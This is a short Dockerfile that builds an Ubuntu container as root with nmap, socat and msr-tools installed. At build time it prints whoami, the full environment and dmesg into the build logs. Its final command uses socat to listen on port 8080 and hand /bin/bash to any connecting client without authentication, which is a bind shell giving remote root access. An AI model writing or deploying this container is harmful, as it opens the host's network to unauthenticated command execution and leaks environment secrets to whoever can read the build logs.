FROM ubuntu
RUN apt-get update && apt-get install -y iputils-ping wget curl nmap sudo socat kmod msr-tools

USER root
ENV HOME /root

RUN echo $(whoami)
RUN echo $(env)
RUN echo $(dmesg)
CMD ["echo", "agargi Printing build logs"]

EXPOSE 8080
CMD ["socat", "-T600", "TCP-LISTEN:8080,reuseaddr,fork", "EXEC:'/bin/bash'"]

#ENTRYPOINT /bin/bash 
